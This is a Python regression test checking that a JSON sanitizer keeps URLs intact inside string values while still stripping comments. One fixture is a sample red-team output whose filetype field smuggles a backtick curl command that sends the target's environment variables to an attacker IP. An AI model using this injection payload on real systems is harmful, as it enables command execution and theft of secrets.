"""
Regression test for the JSON sanitizer URL-truncation bug.

The sanitizer used to strip `//...` as C-style comments with a regex that did
not respect JSON string boundaries. Any `http://` inside a string value was
truncated at the second slash, wiping the rest of the line (or, after
`_fix_control_characters` collapsed real newlines into literal `\\n`, the rest
of the entire response). Red-team FAA outputs were the common casualty.
"""
import unittest

from app.utils.json_sanitizer import JsonSanitizer


FULL_EDDIEG_PAYLOAD = (
    "POST http://photobomb.htb/printer\n"
    "Host: photobomb.htb\n"
    "Content-Length: 392\n"
    "\n"
    "photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetype=jpg;"
    "`curl http://10.10.14.x:4444/t?$(env)`&dimensions=0x0"
)


def _fenced_response(output_value: str) -> str:
    # Markdown-fenced JSON is the common LLM shape that trips the sanitizer path.
    escaped = (
        output_value
        .replace("\\", "\\\\")
        .replace("\"", "\\\"")
        .replace("\n", "\\n")
    )
    return (
        "```json\n"
        "{\n"
        "  \"items\": [\n"
        "    {\n"
        "      \"classification\": \"finding\",\n"
        "      \"content\": \"Command injection via filetype\",\n"
        f"      \"output\": \"{escaped}\",\n"
        "      \"mitre_technique\": \"T1059\",\n"
        "      \"mitre_tactic\": \"Execution\",\n"
        "      \"severity\": \"high\",\n"
        "      \"confidence_score\": 0.95\n"
        "    }\n"
        "  ]\n"
        "}\n"
        "```"
    )


class UrlPreservationTests(unittest.TestCase):
    def test_output_with_url_survives_fenced_response(self) -> None:
        response = _fenced_response(FULL_EDDIEG_PAYLOAD)
        result = JsonSanitizer.parse_llm_json(response)
        self.assertEqual(len(result["items"]), 1)
        self.assertEqual(result["items"][0]["output"], FULL_EDDIEG_PAYLOAD)

    def test_trailing_comma_triggers_sanitizer_url_still_intact(self) -> None:
        response = '{"url": "http://example.com/path",}'
        result = JsonSanitizer.parse_llm_json(response)
        self.assertEqual(result["url"], "http://example.com/path")

    def test_multiple_urls_survive_sanitizer(self) -> None:
        payload = (
            '```json\n'
            '{"items":[{"content":"a","output":"http://a.com // http://b.com",'
            '"classification":"action",}]}\n'
            '```'
        )
        result = JsonSanitizer.parse_llm_json(payload)
        self.assertEqual(result["items"][0]["output"], "http://a.com // http://b.com")


class CommentStrippingStillWorks(unittest.TestCase):
    def test_line_comment_outside_string_is_removed(self) -> None:
        response = '{"a": 1, // comment\n "b": 2}'
        result = JsonSanitizer.parse_llm_json(response)
        self.assertEqual(result, {"a": 1, "b": 2})

    def test_block_comment_outside_string_is_removed(self) -> None:
        response = '{"a": 1 /* block */, "b": 2}'
        result = JsonSanitizer.parse_llm_json(response)
        self.assertEqual(result, {"a": 1, "b": 2})

    def test_comment_marker_inside_string_is_preserved(self) -> None:
        # Trigger sanitizer path with a trailing comma so the string-aware
        # comment stripper actually runs.
        response = '{"output": "visit // here or /* here */", "n": 1,}'
        result = JsonSanitizer.parse_llm_json(response)
        self.assertEqual(result["output"], "visit // here or /* here */")
        self.assertEqual(result["n"], 1)


if __name__ == "__main__":
    unittest.main()
